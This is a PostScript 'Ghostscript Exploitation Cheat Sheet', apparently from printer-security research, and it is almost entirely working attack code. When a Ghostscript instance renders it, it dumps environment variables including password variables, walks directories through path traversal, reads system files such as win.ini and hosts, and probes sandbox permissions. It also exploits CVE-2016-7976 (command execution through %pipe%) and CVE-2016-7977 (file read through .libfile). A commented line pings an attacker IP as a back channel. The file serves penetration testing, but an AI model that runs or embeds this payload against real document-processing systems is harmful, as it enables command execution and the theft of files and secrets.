%!

% --------------------------------------------------------- %
% --------[ Ghostscript Exploitation Cheat Sheet ]--------- %
% created by <jens.a.mueller@rub.de> | hacking-printers.net %
% --------------------------------------------------------- %

% define string
/str 65535 string def

% given token split to strings
/strsplit {[3 1 roll {search {3 1 roll}{exit} ifelse} loop]} def

% concatenate two strings
/strcat {exch dup length 2 index length add string dup
dup 4 2 roll copy length 4 -1 roll putinterval} def

% concatenate two arrays
/arrcat {exch 2 copy length exch length add array dup
dup 5 2 roll copy length exch putinterval} bind def

% get human readable bytesize
/size {/mb 1048576 def /kb 100 def dup mb div cvi str cvs
(.) strcat exch kb mod cvi str cvs strcat (M) strcat} def

% set default coordinates and counters
/x 30 def /y 730 def /row 0 def /col 0 def

% draw a single string
/draw {
  y 10 lt {showpage /y 730 def} if x y moveto show /y y 8 sub def
  /row row 1 add def row 90 mod 0 eq {/x x 292 add def /y 730 def} if
} def

% draw string but crop if to long
/cdraw {str cvs dup length 50 gt {0 50 getinterval draw}{draw} ifelse} def

% draw string but break if to long
/bdraw {str cvs dup length 50 gt {dup dup 0 50 getinterval draw length
50 sub 50 exch getinterval (  ) exch strcat bdraw}{draw} ifelse} def

% draw newline
/newline {() draw} def

% draw error
/errmsg {(*** Error occured on execution ***) cdraw} def

% draw in color
/red {0.7 0 0 setrgbcolor cdraw 0 0 0 setrgbcolor} def
/bred {0.7 0 0 setrgbcolor bdraw 0 0 0 setrgbcolor} def
/green {0 0.5 0 setrgbcolor cdraw 0 0 0 setrgbcolor} def

% set font type and size, draw title
/Helvetica findfont 33.5 scalefont setfont
(Ghostscript Exploitation Cheat Sheet) 30 750 moveto show
/Courier findfont 9 scalefont setfont

% assume -dSAFER by default
/unsafe false def /setunsafe {/unsafe true def} def
/fp {unsafe {(May be false positive because -dSAFER is missing) draw} if} def

% ======================================================================

/info {
  (------------[ GHOSTSCRIPT VERSION ] --------------) cdraw
  product ( ) strcat revision str cvs strcat
  ( | PostScript version ) strcat version strcat cdraw
} def


% ======================================================================

/arch {
  (------------[ HOST ARCHITECTURE ] ----------------) cdraw
  (Byte order: ) currentsystemparams /ByteOrder get
  {(Little-Endian)}{(Big-Endian)} ifelse strcat cdraw
  (Path separator: ) currentsystemparams /GenericResourcePathSep get
  dup (/) eq {( (Posix))}{dup (\\) eq {( (Windows))}{( (Unknown))} ifelse}
  ifelse strcat strcat cdraw
} def


% ======================================================================

/speed {
  (------------[ SPEED MEASUREMENT ] ----------------) cdraw
  % we don't know if there are timeouts for the gs process
  (Host may be prone to denial of service attacks!) red
  /number 10000 def
  /start realtime def
  number
  {
    /chksum 16 string def
    /md5get chksum /MD5Encode filter def
    md5get dup (X) writestring closefile
  } repeat
  /duration realtime start sub def
  (Calculating ) number str cvs strcat ( MD5 checksums took us )
  strcat duration str cvs strcat (ms) strcat cdraw
} def


% ======================================================================

/dirs {
  (------------[ GHOSTSCRIPT DIRECTORIES ] ----------) cdraw
  (Resources: ) currentsystemparams /GenericResourceDir get strcat cdraw
  (Fonts: ) currentsystemparams /FontResourceDir get strcat cdraw
} def


% ======================================================================

/date {
  (------------[ HOST SYSTEM TIME ] -----------------) cdraw
  (Local time: ) 
  (%Calendar%) currentdevparams /Year   get str cvs strcat (-) strcat
  (%Calendar%) currentdevparams /Month  get str cvs strcat (-) strcat
  (%Calendar%) currentdevparams /Day    get str cvs strcat ( ) strcat
  (%Calendar%) currentdevparams /Hour   get str cvs strcat (:) strcat
  (%Calendar%) currentdevparams /Minute get str cvs strcat (:) strcat
  (%Calendar%) currentdevparams /Second get str cvs strcat 
  ( | running since ) strcat realtime str cvs strcat (ms) strcat cdraw
} def


% ======================================================================

/free {
  (------------[ INTERPRETER MEMORY ] ---------------) cdraw
  vmstatus ([VM] max: ) exch size strcat
  ( | used: ) 3 2 roll size strcat strcat
  ( | nesting level: ) 3 2 roll str cvs strcat strcat cdraw
  % ([RAM] size: ) currentsystemparams /RamSize get size strcat cdraw
  % newline ([Font cache]) cdraw cachestatus
  % str cvs (blimit: ) exch strcat cdraw
  % str cvs (cmax: )   exch strcat cdraw
  % str cvs (csize: )  exch strcat cdraw
  % str cvs (mmax: )   exch strcat cdraw
  % str cvs (msize: )  exch strcat cdraw
  % str cvs (bmax: )   exch strcat cdraw
  % str cvs (bsize: )  exch strcat cdraw
  % newline ([User cache]) cdraw ucachestatus
  % str cvs (blimit: ) exch strcat cdraw
  % str cvs (rmax: )   exch strcat cdraw
  % str cvs (rsize: )  exch strcat cdraw
  % str cvs (bmax: )   exch strcat cdraw
  % str cvs (bsize: )  exch strcat cdraw
} def


% ======================================================================

/volume {
  (------------[ HOST %OS% VOLUME ] -----------------) cdraw
  (%os%) currentdevparams {exch 128 string cvs (: ) strcat exch str cvs strcat cdraw} forall
  % (LogicalSize: ) (%os%) currentdevparams /LogicalSize get size strcat cdraw
  % (BlockSize: ) (%os%) currentdevparams /BlockSize get size strcat cdraw
  % (Free: ) (%os%) currentdevparams /Free get size strcat cdraw
} def


% ======================================================================

/dumpenv {
  (------------[ ENVIRONMENT VARIABLES ] ------------) cdraw
  [
    (ALLUSERSAPPDATA)
    (ALLUSERSPROFILE)
    (APPDATA)
    (ASL.LOG)
    (CD)
    (CLASSPATH)
    (CLIENTNAME)
    (CMDCMDLINE)
    (CMDEXTVERSION)
    (COMMONPROGRAMFILES)
    (COMMONPROGRAMFILES(X86))
    (COMMONPROGRAMW6432)
    (COMPUTERNAME)
    (COMSPEC)
    (CSIDL_ADMINTOOLS)
    (CSIDL_ALTSTARTUP)
    (CSIDL_APPDATA)
    (CSIDL_BITBUCKET)
    (CSIDL_CDBURN_AREA)
    (CSIDL_COMMON_ADMINTOOLS)
    (CSIDL_COMMON_ALTSTARTUP)
    (CSIDL_COMMON_APPDATA)
    (CSIDL_COMMON_DESKTOPDIRECTORY)
    (CSIDL_COMMON_DOCUMENTS)
    (CSIDL_COMMON_FAVORITES)
    (CSIDL_COMMON_MUSIC)
    (CSIDL_COMMON_PICTURES)
    (CSIDL_COMMON_PROGRAMS)
    (CSIDL_COMMON_STARTMENU)
    (CSIDL_COMMON_STARTUP)
    (CSIDL_COMMON_TEMPLATES)
    (CSIDL_COMMON_VIDEO)
    (CSIDL_CONNECTIONS)
    (CSIDL_CONTACTS)
    (CSIDL_CONTROLS)
    (CSIDL_COOKIES)
    (CSIDL_DEFAULT_APPDATA)
    (CSIDL_DEFAULT_CONTACTS)
    (CSIDL_DEFAULT_COOKIES)
    (CSIDL_DEFAULT_DESKTOP)
    (CSIDL_DEFAULT_DOWNLOADS)
    (CSIDL_DEFAULT_FAVORITES)
    (CSIDL_DEFAULT_HISTORY)
    (CSIDL_DEFAULT_INTERNET_CACHE)
    (CSIDL_DEFAULT_LOCAL_APPDATA)
    (CSIDL_DEFAULT_MYDOCUMENTS)
    (CSIDL_DEFAULT_MYMUSIC)
    (CSIDL_DEFAULT_MYPICTURES)
    (CSIDL_DEFAULT_MYVIDEO)
    (CSIDL_DEFAULT_PERSONAL)
    (CSIDL_DEFAULT_PROGRAMS)
    (CSIDL_DEFAULT_QUICKLAUNCH)
    (CSIDL_DEFAULT_RECENT)
    (CSIDL_DEFAULT_SENDTO)
    (CSIDL_DEFAULT_STARTMENU)
    (CSIDL_DEFAULT_STARTUP)
    (CSIDL_DEFAULT_TEMPLATES)
    (CSIDL_DESKTOP)
    (CSIDL_DESKTOPDIRECTORY)
    (CSIDL_DRIVES)
    (CSIDL_FAVORITES)
    (CSIDL_FONTS)
    (CSIDL_HISTORY)
    (CSIDL_INTERNET)
    (CSIDL_INTERNET_CACHE)
    (CSIDL_LOCAL_APPDATA)
    (CSIDL_MYDOCUMENTS)
    (CSIDL_MYMUSIC)
    (CSIDL_MYPICTURES)
    (CSIDL_MYVIDEO)
    (CSIDL_NETHOOD)
    (CSIDL_NETWORK)
    (CSIDL_PERSONAL)
    (CSIDL_PLAYLISTS)
    (CSIDL_PRINTERS)
    (CSIDL_PRINTHOOD)
    (CSIDL_PROFILE)
    (CSIDL_PROGRAM_FILES)
    (CSIDL_PROGRAM_FILES_COMMON)
    (CSIDL_PROGRAM_FILES_COMMONX86)
    (CSIDL_PROGRAM_FILESX86)
    (CSIDL_PROGRAMS)
    (CSIDL_RECENT)
    (CSIDL_RESOURCES)
    (CSIDL_SENDTO)
    (CSIDL_STARTMENU)
    (CSIDL_STARTUP)
    (CSIDL_SYSTEM)
    (CSIDL_TEMPLATES)
    (CSIDL_WINDOWS)
    (CSSCRIPT_DIR)
    (CSSCRIPT_SHELLEX_DIR)
    (DATE)
    (DEFAULTUSERPROFILE)
    (DXROOT)
    (EMC_AUTOPLAY)
    (ERRORLEVEL)
    (FP_NO_HOST_CHECK)
    (FPS_BROWSER_APP_PROFILE_STRING)
    (FPS_BROWSER_USER_PROFILE_STRING)
    (HIGHESTNUMANODENUMBER)
    (HOMEDRIVE)
    (HOMEPATH)
    (LOCALAPPDATA)
    (LOGONSERVER)
    (NT)
    (NUMBER_OF_PROCESSORS)
    (OS)
    (PASSWD)
    (PASSWORD)
    (PATH)
    (PATHEXT)
    (PROCESSOR_ARCHITECTURE)
    (PROCESSOR_ARCHITEW6432)
    (PROCESSOR_IDENTIFIER)
    (PROCESSOR_LEVEL)
    (PROCESSOR_REVISION)
    (PROFILESDIRECTORY)
    (PROFILESFOLDER)
    (PROGRAMDATA)
    (PROGRAMFILES)
    (PROGRAMFILES(X86))
    (PROGRAMW6432)
    (PROMPT)
    (PSMODULEPATH)
    (PUBLIC)
    (QTJAVA)
    (RANDOM)
    (ROXIOCENTRAL)
    (SESSIONNAME)
    (SYSTEM)
    (SYSTEM16)
    (SYSTEM32)
    (SYSTEMDRIVE)
    (SYSTEMPROFILE)
    (SYSTEMROOT)
    (TEMP)
    (TIME)
    (TMP)
    (UNDER)
    (USER)
    (USERDNSDOMAIN)
    (USERDOMAIN)
    (USERDOMAIN_ROAMINGPROFILE)
    (USERNAME)
    (USERPROFILE)
    (USERSID)
    (VS100COMNTOOLS)
    (VS90COMNTOOLS)
    (VSSDK100INSTALL)
    (VSSDK90INSTALL)
    (WINDIR)
  ]
  % for all variables, try to get values
  {dup getenv {str cvs exch (: ) strcat exch strcat bred}{pop} ifelse} forall
} def


% ======================================================================

/params {
  (------------[ CURRENT SYSTEM PARAMS ] ------------) cdraw
  currentsystemparams {exch str cvs (: ) strcat exch str cvs strcat cdraw} forall
} def


% ======================================================================

/args {
  (------------[ COMMAND LINE ARGUMENTS ] -----------) cdraw
  [
    (BATCH)
    (DELAYBIND)
    (DELAYSAFER)
    (DISKFONTS)
    (DISPLAYING)
    (DOPS)
    (ESTACKPRINT)
    (FAKEFONTS)
    (FIXEDMEDIA)
    (FIXEDRESOLUTION)
    (INTERPOLATE)
    (JOBSERVER)
    (LOCALFONTS)
    (NOBIND)
    (NOCACHE)
    (NOCCFONTS)
    (NOCIE)
    (NOFONTMAP)
    (NOFONTPATH)
    (NOGC)
    (NOMEDIAATTRS)
    (NOOUTERSAVE)
    (NOPAGEPROMPT)
    (NOPAUSE)
    (NOPLATFONTS)
    (NOPROMPT)
    (NOPSICC)
    (NOSAFER)
    (NOSUBSTDEVICECOLORS)
    (NOTRANSPARENCY)
    (ORIENT1)
    (OSTACKPRINT)
    (OutputFile)
    (QUIET)
    (RENDERTTNOTDEF)
    (SHORTERRORS)
    (STRICT)
    (TTYPAUSE)
    (WRITESYSTEMDICT)
  ]
  (Infile: ) currentfile .filename {}{(reading from stdin)} ifelse strcat bdraw
  (Parameters: ) SAFER {(-dSAFER set) strcat green}{(-dSAFER missing!) strcat red setunsafe} ifelse
  % for all parameters, show if enabled
  {{dup cvx exec {str cvs (            ) exch strcat cdraw} if} stopped pop} forall clear
} def


% ======================================================================

/libpath {
  (------------[ GHOSTSCRIPT LIBPATH ] -------------) cdraw
  /LIBPATH .systemvar {bdraw} forall
} def


% ======================================================================

/dicts {
  (------------[ KNOWN DICTIONARIES ] ---------------) cdraw
  (acl   len   max  dictionary) cdraw
  (===========================) cdraw
  /format {dup length 5 exch sub ( ) exch {( ) strcat} repeat} def
  /dictinfo {
    dup dup dup dup
    rcheck {(r)}{(-)} ifelse 5 4 roll
    wcheck {(w)}{(-)} ifelse strcat 4 3 roll
    xcheck {(x)}{(-)} ifelse strcat 3 2 roll
    length str cvs format exch strcat strcat exch
    maxlength str cvs format exch strcat strcat
  } def
  systemdict              dictinfo (  systemdict)          strcat bdraw
  statusdict              dictinfo (  statusdict)          strcat bdraw
  userdict                dictinfo (  userdict)            strcat bdraw
  globaldict              dictinfo (  globaldict)          strcat bdraw
  serverdict              dictinfo (  serverdict)          strcat bdraw
  errordict               dictinfo (  errordict)           strcat bdraw
  1183615869 internaldict dictinfo (  internaldict)        strcat bdraw
  currentpagedevice       dictinfo (  currentpagedevice)   strcat bdraw
  currentuserparams       dictinfo (  currentuserparams)   strcat bdraw
  currentsystemparams     dictinfo (  currentsystemparams) strcat bdraw
} def


% ======================================================================

/perms {
  (------------[ GHOSTSCRIPT PERMISSIONS ] ----------) cdraw
  /severity {dup length 0 eq {(Not allowed at all) green} if
  {dup (*) eq {(Whole filesystem!) red pop}{cdraw} ifelse} forall} def
  (===================== Exec =======================) cdraw
  {(%pipe%/bin/nonexistent) (w) file pop (Arbitrary commands!) red}
  stopped {(Not allowed at all) green} if
  (===================== Delete =====================) cdraw
  currentuserparams /PermitFileControl get severity
  (===================== Write ======================) cdraw
  currentuserparams /PermitFileWriting get severity
  (===================== Read =======================) cdraw
  currentuserparams /PermitFileReading get severity 
} def


% ======================================================================

/stat {
  (------------[ SIZE, CTIME, MTIME, NAME ] ---------) cdraw
  [
    (/)
    (*)
    (~)
    (.)
    (..)
    (../../../../../../../../*)
    (file:///)

  % (C:/)
  % (D:/)
    (C:/Windows/win.ini)
    (C:/Windows/system.ini)

    (tmp)
    (lib)
    (iccprofiles)
    (Resource)
    (Resource/Decoding)
    (Resource/Encoding)
    (Resource/Font)
    (Resource/Init)
    (gs_rdlin.ps)
  ]
  % for all filenames, show size, atime, mtime and name
  {dup status {str cvs ( ) strcat exch str cvs strcat 3 1 roll str
  cvs ( ) strcat 3 2 roll strcat ( ) strcat 3 2 roll strcat bred pop}
  {pop} ifelse} forall ([...]) red
} def


% ======================================================================

% TBD: print MD5SUM of file, so one can easily check on http://nsrl.hashsets.com/
/readfile {
  (------------[ CUSTOM GS_RDLIN.PS ] ---------------) cdraw
  /found false def
  /LIBPATH .systemvar
  { currentsystemparams /GenericResourcePathSep get strcat (gs_rdlin.ps) strcat
    dup status {pop pop pop pop (r) file 8 {dup str readline {cdraw}{pop} ifelse}
    repeat closefile ([...]) cdraw /found true def exit}{pop} ifelse
  } forall
  found not {(Could not find or open init file) green} if
} def

% ======================================================================

/cve-2016-7976 {
  (------------[ CVE-2016-7976 (RCE) ] --------------) cdraw
  /cve_exec {
  % (Executing: ) cmd strcat cdraw
    {currentdevice null true mark /PostRenderProfile cmd .putdeviceparams} stopped clear
    {currentdevice null true mark /ProofProfile      cmd .putdeviceparams} stopped clear
    {currentdevice null true mark /DeviceLinkProfile cmd .putdeviceparams} stopped clear
  % {currentdevice null true mark /OutputICCProfile  cmd .putdeviceparams} stopped clear % coredump!
    {currentdevice null true mark /GraphicICCProfile cmd .putdeviceparams} stopped clear
    {currentdevice null true mark /ImageICCProfile   cmd .putdeviceparams} stopped clear
    {currentdevice null true mark /TextICCProfile    cmd .putdeviceparams} stopped clear
  } def

  % try to get backchannel using temporary file
  /filename (TEST_) realtime str cvs strcat def
  /cmd (%pipe%REM. >) filename strcat def cve_exec
  filename status {
    pop pop pop pop (Vulnerable to arbitrary command execution!) red}{(Not vulnerable) green
  } ifelse
  /cmd (%pipe%DEL /F ) filename strcat def cve_exec

  % may also try to get a backchannel via the internet
  % /cmd (%pipe%ping MY_IP) def cve_exec
} def


% ======================================================================

/cve-2016-7977 {
  (------------[ CVE-2016-7977 (LFI) ] --------------) cdraw
  1 {
    /lfi {{str readstring pop (\n) strsplit {red} forall} if fp exit} def
    % strategy #1: read file using .libfile
    {(C:/Windows/system.ini) .libfile} stopped {clear}{lfi} ifelse
    {(C:/Windows/win.ini) .libfile} stopped {clear}{lfi} ifelse
    {(C:/Windows/system32/drivers/etc/hosts) .libfile} stopped {clear}{lfi} ifelse

    % strategy #2: read file using findlibfile
    {(C:/Windows/system.ini) findlibfile} stopped {clear}{lfi} ifelse
    {(C:/Windows/win.ini) findlibfile} stopped {clear}{lfi} ifelse
    {(C:/Windows/system32/drivers/etc/hosts) findlibfile} stopped {clear}{lfi} ifelse

    % finally we get here
    (Not vulnerable) green
  } repeat
} def


% ======================================================================

/drives {
  (------------[ AVAILABLE DRIVES] ------------------) cdraw
  [
    (C:/)
    (D:/)
    (E:/)
    (F:/)
    (G:/)
    (H:/)
    (I:/)
    (J:/)
    (K:/)
    (L:/)
    (M:/)
    (N:/)
    (O:/)
    (P:/)
    (Q:/)
    (R:/)
    (S:/)
    (T:/)
    (U:/)
    (V:/)
    (W:/)
    (X:/)
    (Y:/)
    (Z:/)
  ]
  {{dup status {pop pop pop pop cdraw}{pop} ifelse} stopped pop} forall
} def


% ======================================================================

/drivelist {
  [
    (C:/)
    (D:/)
    (E:/)
    (F:/)
    (G:/)
    (H:/)
    (I:/)
    (J:/)
    (K:/)
    (L:/)
    (M:/)
    (N:/)
    (O:/)
    (P:/)
    (Q:/)
    (R:/)
    (S:/)
    (T:/)
    (U:/)
    (V:/)
    (W:/)
    (X:/)
    (Y:/)
    (Z:/)
  ]
  {{dup dup status {pop pop pop pop 

  (------------[ DRIVE ) exch strcat ( LISTINGS] ----------------) strcat cdraw

  % make sure we don't cause DoS on recursive interpreters
  /limit 7 def /counter 0 def /increment {/counter counter 1 add def} def

  % for all drives try to list filenames/contained files
  {(*) strcat {bred increment counter limit ge {exit} if} str filenameforall ([...]) red} stopped pop

  }{pop} ifelse} stopped pop} forall
} def


% ======================================================================

/dirlist {
  (------------[ DIRECTORY LISTINGS ] ---------------) cdraw
  [
    % don't use this to avoid DoSing recursive interpreters
    % (../../../../../../../*)
    % use this instead to get root directory listing

    (../../../../../../../../../../???)
    (../../../../../../../../../../???/)
    (../../../../../../../../../../????)
    (../../../../../../../../../../????/)
    (../../../../../../../../../../?????)
    (../../../../../../../../../../?????/)
    (../../../../../../../../../../??????)
    (../../../../../../../../../../??????/)
    (../../../../../../../../../../???????)
    (../../../../../../../../../../???????/)
    (../../../../../../../../../../????????)
    (../../../../../../../../../../????????/)
    (../../../../../../../../../../?????????)
    (../../../../../../../../../../?????????/)
    (../../../../../../../../../../??????????)
    (../../../../../../../../../../??????????/)
    (../../../../../../../../../../???????????)
    (../../../../../../../../../../???????????/)
    (../../../../../../../../../../????????????)
    (../../../../../../../../../../????????????/)
    (../../../../../../../../../../?????????????)
    (../../../../../../../../../../?????????????/)
    (../../../../../../../../../../??????????????)
    (../../../../../../../../../../??????????????/)
    (../../../../../../../../../../???????????????)
    (../../../../../../../../../../???????????????/)
    (../../../../../../../../../../????????????????)
    (../../../../../../../../../../????????????????/)

    (\\)
    (/)
    (*)
    (?)
    (??)
    (???)
    (????)
    (?????)
    (??????)
    (???????)
    (????????)
    (?????????)
    (??????????)
    (???????????)
    (????????????)
    (?????????????)
    (~)
    (.)
    (..)
    (./..)
    (file:///)

    (tmp)
    (lib)
    (iccprofiles)
    (Resource)
    (Resource/Decoding)
    (Resource/Encoding)
    (Resource/Font)
    (Resource/Init)
    (gs_rdlin.ps)
  ]
  % add pathnames where we're permitted to read files
  {currentuserparams /PermitFileReading get arrcat} stopped pop

  % add library pathnames
  {/LIBPATH .systemvar arrcat} stopped pop

  % make sure we don't cause DoS on recursive interpreters
  /limit 500 def /counter 0 def /increment {/counter counter 1 add def} def
  % for all filenames/dirnames try to list filenames/contained files
  {{{bred increment counter limit ge {exit} if} str filenameforall} stopped pop} forall
} def

% ======================================================================

        {info}          stopped {errmsg} if
newline {free}          stopped {errmsg} if
% newline {arch}        stopped {errmsg} if
newline {date}          stopped {errmsg} if
newline {speed}         stopped {errmsg} if
newline {args}          stopped {errmsg} if
% newline {dicts}       stopped {errmsg} if
newline {dirs}          stopped {errmsg} if
newline {libpath}       stopped {errmsg} if
newline {dumpenv}       stopped {errmsg} if
% newline {volume}      stopped {errmsg} if
% newline {params}      stopped {errmsg} if
newline {perms}         stopped {errmsg} if
newline {stat}          stopped {errmsg} if
newline {readfile}      stopped {errmsg} if
newline {cve-2016-7976} stopped {errmsg} if
newline {cve-2016-7977} stopped {errmsg} if
% newline {drives}      stopped {errmsg} if
newline {drivelist}     stopped {errmsg} if
newline {dirlist}       stopped {errmsg} if

showpage
